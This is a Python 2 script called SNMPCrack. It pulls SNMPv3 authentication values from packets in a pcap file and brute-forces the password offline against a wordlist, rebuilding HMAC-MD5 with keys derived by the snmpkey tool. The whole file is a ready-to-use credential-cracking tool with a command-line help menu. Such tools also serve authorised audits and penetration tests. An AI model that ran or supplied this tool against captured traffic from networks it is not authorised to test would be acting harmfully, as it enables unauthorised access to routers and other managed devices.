#! /usr/bin/python
import base64
import binascii
import commands
import getopt
from pipes import quote
from pyasn1_modules.rfc3412 import SNMPv3Message
import re
from scapy.all import *
from scapy.layers.snmp import SNMP, SNMPresponse, SNMPvarbind
import sys


class SnmpCrack : 
    
    def __init__(self, pFile, pWordList) :
        self.pcapFile = pFile
        self.wordList = pWordList
        self.analyzeWordlist()
        self.findSnmpPacket()
    
    def analyzeWordlist(self):
        try : 
            f = open(self.wordList, 'r')
    
            self.numberOfLine = 0
            for line in f:
                self.numberOfLine += 1
        except : 
            print "\033[1;31mERROR : Problem append when reading wordlist file.\033[0m"
            sys.exit()     
    
    def xoredAuthKey(self, authKey, toXor):
        tmp = []
        deb = ""
        #generate int array based on generated auth key
        for r in range(0, len(authKey), 2) : 
            tmp.append(int(str(authKey[r:r+2]), 16))
            deb += 'Ox'+authKey[r:r+2]
        
        #xor authKey with defined padding value
        toXor2 = ""
        for t in tmp :
            toXor2 += base64.b16encode(chr( t ^ ord(toXor)))
           
        #complete xor opearation with defined padding value 
        #for match data block size
        for i in range(len(toXor2), 80) : 
            toXor2 += base64.b16encode(toXor)
            
        return toXor2

    #Method to find SNMP packet With Auth values
    def findSnmpPacket(self):
    
        #with PcapReader(self.pcapFile) as pcap_reader:
        print "\nSearching for SNMP packet with authentication values"
        try :
            pkts = rdpcap(self.pcapFile)
        except : 
            print "\033[1;31mERROR : Unsupported pcap header format or version"
            print "please, update file format with tcpdump format.\033[0m"
            sys.exit()
            
        for pkt in pkts:
            try :
                snmp = pkt[SNMP]
                
                if binascii.hexlify(str(snmp.version))[-1] == '3' : 
                    
                    self.msgAuthoritativeEngineId = binascii.hexlify(str(snmp.PDU))[12:(34+12)]
                    self.msgAuthenticationParameter = binascii.hexlify(str(snmp.PDU))[74:98]
                    self.wholeMessage = binascii.hexlify(str(snmp))
                    self.bruteForce()
                
                if self.found == True : sys.exit(1)
            except (KeyboardInterrupt, SystemExit) as e:
                sys.exit()
            except : 
                continue    
            
    
    def bruteForce(self):
        
        start = int(time.time())
        print "\n\033[1;36mSNMPv3 Packet found, testing bruteforce with %d words\033[0m\n" % self.numberOfLine
        self.found = False
        final = self.msgAuthenticationParameter
        paquet = self.wholeMessage.replace(final, ("0")*len(final))
        
        total = self.numberOfLine
        i = 1
        for pwd in open(self.wordList).readlines() : 
            
            
            
            try : 
                pwd = pwd.replace("\n", "").replace("\r", "")
                #print "%d/%d" % (i, self.numberOfLine)
                command = """snmpkey md5 %s %s""" % (quote(pwd), self.msgAuthoritativeEngineId)
                res = commands.getstatusoutput(command)
                authKey = res[1].split("\n")[0].split(' ')[1].split('x')[1]                
                
                K1 = self.xoredAuthKey(authKey, "\x36").lower()
                K2 = self.xoredAuthKey(authKey, "\x5C").lower()
                
                whole = (K1 + paquet)
                whole = binascii.unhexlify(whole.replace("\r", "").replace("\n", ""))
                   
                hashMd5 = hashlib.md5()
                hashMd5.update(whole)
                md5K1WholePaquet = hashMd5.hexdigest()
                
                whole = K2 + md5K1WholePaquet
                whole = binascii.unhexlify(whole.replace("\r", "").replace("\n", ""))
                hashMd5 = hashlib.md5()
                hashMd5.update(whole)
                md5K2K1 = hashMd5.hexdigest()
                
                if md5K2K1[0:24] == final : 
                    print "\033[1;32mPassword found : %s \033[0m" % pwd
                    self.found = True
                    break;
                
                fin = int(time.time())
                if (fin - start) % 30 == 0 : 
                    print "%d/%d" % (i, self.numberOfLine)
                    time.sleep(0.5)
            except (KeyboardInterrupt, SystemExit) as e : 
                print "\n\033[1;31mStopping brute force attack !\033[0m"
                sys.exit()
            except : 
                continue
            i += 1        
            
        
def usage() :
    print """
--------------------------------------------------------------------------------
SNMPCrack is a tool for crack SNMP V3 authentication with a wordlist file.
It's based on snmpkey tool (http://search.cpan.org/~dtown/Net-SNMP-5.2.0/snmpkey.PL)  
You can install it with perl install command "cpan snmpkey"
 
For more effcient, it's strongly recommanded to use pcap with specific(s) SNMPv3 packet(s)

OPTIONS :\033[0;33m
-h : show this help menu
-f : pcap file contents SNMP authentication
-w : Wordlist file used for crack SNMPV3 password
--------------------------------------------------------------------------------
"""
    sys.exit()

def testFiles(fileName):
    try : 
        f = open(fileName, 'r')

    except : 
        print '\033[1;31m ERROR : unable to read file %s \033[0m' %fileName
        usage()
    f.close()

def testSnmpKey():
    res = commands.getstatusoutput("snmpkey")
    if "not found" in res[1] : 
        print "\033[1;31m ERROR :snmpkey not installed.\nUse http://search.cpan.org/~dtown/Net-SNMP-5.2.0/snmpkey.PL\033[0m"
        sys.exit()

def main(argv):                         
                  
    try:                                
        opts, args = getopt.getopt(argv, "hf:w:") 
    except getopt.GetoptError as err:           
        print err
        usage()                     

   
    pcapFile = ""
    wlFile = ""

    for opt, arg in opts : 
        if opt in ("-h", "--help"):
            usage()
            sys.exit()
        if opt in ("-f", "--file") : 
            pcapFile = arg 
        if opt in ("-w", "--wordlist") : 
            wlFile = arg 
        
    if pcapFile == "" or wlFile == "" : 
        print '\033[1;31m ERROR : -f and -w are both mandatory \033[0m'
        usage()
    
    testFiles(pcapFile)
    testFiles(wlFile)
    testSnmpKey()
    
    snmpcrack = SnmpCrack(pcapFile, wlFile)
    
    
if __name__ == "__main__":
    
    main(sys.argv[1:])
    